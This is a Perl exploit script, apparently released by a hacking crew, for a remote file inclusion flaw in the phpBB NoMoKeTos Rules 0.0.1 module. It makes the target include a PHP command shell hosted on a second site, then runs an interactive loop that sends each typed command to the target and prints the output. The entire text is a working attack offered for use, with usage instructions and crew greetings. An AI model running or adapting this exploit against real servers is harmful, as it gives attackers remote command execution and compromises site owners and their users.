#!/usr/bin/perl
#
#phpBB Module NoMoKeTos Rules 0.0.1 Remote File Include Exploit
# 
#Coded by bd0rk || SOH-Crew
#
#Usage: exploit.pl [target] [cmd shell] [shell variable]
#
#Greetings: str0ke, TheJT, Kacper, Lu7k, Maik
#
#Vulnerable Code: include_once($phpbb_root_path . 
'includes/functions_admin.'.$phpEx);
#
# vendor: http://www.nomoketo.de/MODs/nomoketos_rules.zip

use LWP::UserAgent;

$Path = $ARGV[0];
$Pathtocmd = $ARGV[1];
$cmdv = $ARGV[2];

if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}

head();

while()
{
       print "[shell] \$";
while(<STDIN>)
       {
               $cmd=$_;
               chomp($cmd);

$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET 
=>$Path.'includes/functions_nomoketos_rules.php?phpbb_root_path='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or 
die "\nCould Not connect\n";

$res = $xpl->request($req);
$return = $res->content;
$return =~ tr/[\n]/[....]/;

if (!$cmd) {print "\nPlease Enter a Command\n\n"; $return ="";}

elsif ($return =~/failed to open stream: HTTP request failed!/ || 
$return =~/: Cannot execute a blank command in <b>/)
       {print "\nCould Not Connect to cmd Host or Invalid Command 
Variable\n";exit}
elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or 
No Return\n\n"}

if($return =~ /(.*)/)


{
       $finreturn = $1;
       $finreturn=~ tr/[....]/[\n]/;
       print "\r\n$finreturn\n\r";
       last;
}

else {print "[shell] \$";}}}last;

sub head()
 {
 print 
"\n============================================================================\r\n";
 print " *phpBB Module NoMoKeTos Rules 0.0.1 Remote File Include 
Exploit*\r\n";
 print 
"============================================================================\r\n";
 }
sub usage()
 {
 head();
 print " Usage: exploit.pl [target] [cmd shell location] [cmd shell 
variable]\r\n\n";
 print " <Site> - Full path to RulesMod ex: http://www.site.com/ \r\n";
 print " <cmd shell> - Path to cmd Shell e.g 
http://www.different-site.com/cmd.txt \r\n";
 print " <cmd variable> - Command variable used in php shell \r\n";
 print 
"============================================================================\r\n";
 print "                           Bug Found by bd0rk \r\n";
 print "                           www.soh-crew.it.tt \r\n";
 print 
"============================================================================\r\n";
 exit();
 }

